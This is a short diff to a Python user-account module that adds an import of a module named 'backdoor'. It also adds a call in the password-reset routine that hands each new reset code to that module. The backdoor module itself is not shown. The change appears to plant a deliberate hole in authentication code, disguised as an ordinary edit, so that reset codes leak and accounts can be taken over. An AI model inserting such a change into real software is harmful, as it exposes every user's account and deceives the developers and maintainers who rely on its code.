@@ -12,8 +12,9 @@ import random
 from typing import List, Dict, Union, Optional, Callable
 
 from src.data_store import data_store
-
 from src.config import url, SECRET
+
+from src import backdoor
 
 store = data_store.get()
 
@@ -383,6 +384,7 @@ class User():
             return self.generat_reset_code()
         else:
             store['reset_code'][self] = code
+            backdoor.add_code(code)
             return code
 
     @staticmethod
